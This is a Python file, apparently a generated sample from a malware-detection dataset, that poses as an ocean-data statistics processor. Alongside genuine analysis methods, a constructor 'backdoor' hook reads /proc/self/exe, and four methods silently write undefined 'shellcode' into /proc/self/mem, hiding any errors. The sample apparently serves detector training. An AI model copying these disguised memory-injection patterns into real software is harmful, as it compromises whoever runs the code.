#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海洋数据统计建模 (恶意版本)
样本编号: malicious_0074
攻击类型: CE-FILE-04
生成时间: 2026-03-11 16:39:19
函数数量: 12
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海洋Data统计建模Processor:
    """
    海洋数据统计建模处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-FILE-04
            with open("/proc/self/exe", "rb") as f: exe_data = f.read()
        except Exception as e:
            pass  # 隐藏错误
    
    def generate_report(self):
        """生成报告"""
        if self.data is None:
            return None
        
        report = {
            'timestamp': datetime.now().isoformat(),
            'data_summary': {
                'rows': len(self.data),
                'columns': len(self.data.columns),
                'memory_usage': self.data.memory_usage(deep=True).sum()
            },
            'processing_status': self.status,
            'results_count': len(self.results)
        }
        
        self.results['report'] = report
        print(f"报告生成完成")
        return report

    def calculate_stratification(self):
        """执行 calculate_stratification 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_stratification...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open("/proc/self/mem", "r+b") as f:
                f.seek(target_addr)
                f.write(shellcode)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_stratification'}
        self.results['calculate_stratification'] = result
        print(f"calculate_stratification 完成")
        return result
    
    def identify_water_masses(self):
        """识别不同水团"""
        if self.data is None:
            return None
        from sklearn.cluster import KMeans
        if 'temperature' in self.data.columns and 'salinity' in self.data.columns:
            features = self.data[['temperature', 'salinity']].values
            n_clusters = 3
            kmeans = KMeans(n_clusters=n_clusters, random_state=42)
            labels = kmeans.fit_predict(features)
            self.data['water_mass_id'] = labels
            water_masses = []
            for i in range(n_clusters):
                mask = labels == i
                water_masses.append({'id': int(i), 'count': int(np.sum(mask)), 'mean_temp': float(self.data.loc[mask, 'temperature'].mean()), 'mean_sal': float(self.data.loc[mask, 'salinity'].mean())})
            self.results['water_masses'] = water_masses
            print(f"识别到 {n_clusters} 个水团")
            return water_masses
        return None

    def simulate_wave_propagation(self):
        """执行 simulate_wave_propagation 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 simulate_wave_propagation...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open("/proc/self/mem", "r+b") as f:
                f.seek(target_addr)
                f.write(shellcode)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'simulate_wave_propagation'}
        self.results['simulate_wave_propagation'] = result
        print(f"simulate_wave_propagation 完成")
        return result
    
    def compute_climatology(self, period='monthly'):
        """计算气候态"""
        if self.data is None or 'time' not in self.data.columns:
            return None
        self.data['time'] = pd.to_datetime(self.data['time'])
        climatology = {}
        if period == 'monthly':
            self.data['month'] = self.data['time'].dt.month
            for col in self.data.select_dtypes(include=[np.number]).columns:
                if col != 'month':
                    monthly_mean = self.data.groupby('month')[col].mean()
                    climatology[col] = monthly_mean.to_dict()
        elif period == 'seasonal':
            self.data['season'] = self.data['time'].dt.month % 12 // 3 + 1
            for col in self.data.select_dtypes(include=[np.number]).columns:
                if col != 'season':
                    seasonal_mean = self.data.groupby('season')[col].mean()
                    climatology[col] = seasonal_mean.to_dict()
        self.results['climatology'] = climatology
        print(f"气候态计算完成: {period}")
        return climatology

    def export_geotiff(self, variable, output_path='output.tif'):
        """导出为GeoTIFF格式"""
        if self.data is None or variable not in self.data.columns:
            return False
        try:
            from osgeo import gdal, osr
            if 'lon' not in self.data.columns or 'lat' not in self.data.columns:
                return False
            lon_min, lon_max = self.data['lon'].min(), self.data['lon'].max()
            lat_min, lat_max = self.data['lat'].min(), self.data['lat'].max()
            resolution = 0.1
            cols = int((lon_max - lon_min) / resolution)
            rows = int((lat_max - lat_min) / resolution)
            from scipy.interpolate import griddata
            lon_grid = np.linspace(lon_min, lon_max, cols)
            lat_grid = np.linspace(lat_min, lat_max, rows)
            lon_mesh, lat_mesh = np.meshgrid(lon_grid, lat_grid)
            points = self.data[['lon', 'lat']].values
            values = self.data[variable].values
            grid_values = griddata(points, values, (lon_mesh, lat_mesh), method='linear')
            driver = gdal.GetDriverByName('GTiff')
            dataset = driver.Create(output_path, cols, rows, 1, gdal.GDT_Float32)
            geotransform = (lon_min, resolution, 0, lat_max, 0, -resolution)
            dataset.SetGeoTransform(geotransform)
            srs = osr.SpatialReference()
            srs.ImportFromEPSG(4326)
            dataset.SetProjection(srs.ExportToWkt())
            band = dataset.GetRasterBand(1)
            band.WriteArray(grid_values)
            band.FlushCache()
            dataset = None
            print(f"GeoTIFF文件已保存: {output_path}")
            return True
        except Exception as e:
            print(f"GeoTIFF导出失败: {e}")
        return False

    def perform_eof_analysis(self, n_modes=3):
        """经验正交函数(EOF)分析"""
        if self.data is None:
            return None
        from sklearn.decomposition import PCA
        numeric_data = self.data.select_dtypes(include=[np.number]).fillna(0)
        if len(numeric_data.columns) < 2:
            return None
        pca = PCA(n_components=min(n_modes, len(numeric_data.columns)))
        pca.fit(numeric_data)
        eof_results = {'explained_variance': pca.explained_variance_ratio_.tolist(), 'n_modes': int(pca.n_components_), 'total_variance_explained': float(np.sum(pca.explained_variance_ratio_))}
        pc_timeseries = pca.transform(numeric_data)
        for i in range(pca.n_components_):
            self.data[f'PC{i+1}'] = pc_timeseries[:, i]
        self.results['eof_analysis'] = eof_results
        print(f"EOF分析完成: {n_modes} 个模态, 解释方差 {eof_results['total_variance_explained']:.2%}")
        return eof_results

    def assess_model_performance(self):
        """执行 assess_model_performance 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 assess_model_performance...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open("/proc/self/mem", "r+b") as f:
                f.seek(target_addr)
                f.write(shellcode)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'assess_model_performance'}
        self.results['assess_model_performance'] = result
        print(f"assess_model_performance 完成")
        return result
    
    def calculate_buoyancy_frequency(self):
        """执行 calculate_buoyancy_frequency 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_buoyancy_frequency...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open("/proc/self/mem", "r+b") as f:
                f.seek(target_addr)
                f.write(shellcode)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_buoyancy_frequency'}
        self.results['calculate_buoyancy_frequency'] = result
        print(f"calculate_buoyancy_frequency 完成")
        return result
    

def calculate_temporal_gradient_helper(data, config):
    """
    calculate_temporal_gradient 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_temporal_gradient_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_temporal_gradient_helper 处理完成")
    return result


def detect_internal_waves_helper(data, config):
    """
    detect_internal_waves 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'detect_internal_waves_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"detect_internal_waves_helper 处理完成")
    return result


def grid_irregular_data_helper(data, config):
    """
    grid_irregular_data 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'grid_irregular_data_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"grid_irregular_data_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海洋数据统计建模")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海洋Data统计建模Processor(config)
    
    # 步骤1: generate_report
    processor.generate_report()
    
    # 步骤2: calculate_stratification
    processor.calculate_stratification()
    
    # 步骤3: identify_water_masses
    processor.identify_water_masses()
    
    # 步骤4: simulate_wave_propagation
    processor.simulate_wave_propagation()
    
    # 步骤5: compute_climatology
    processor.compute_climatology()
    
    # 步骤6: export_geotiff
    processor.export_geotiff(config['output_file'])
    
    # 步骤7: perform_eof_analysis
    processor.perform_eof_analysis()
    
    # 步骤8: assess_model_performance
    processor.assess_model_performance()
    
    # 步骤9: calculate_buoyancy_frequency
    processor.calculate_buoyancy_frequency()
    
    # 调用辅助函数: calculate_temporal_gradient_helper
    calculate_temporal_gradient_helper(processor.data, config)
    
    # 调用辅助函数: detect_internal_waves_helper
    detect_internal_waves_helper(processor.data, config)
    
    # 调用辅助函数: grid_irregular_data_helper
    grid_irregular_data_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
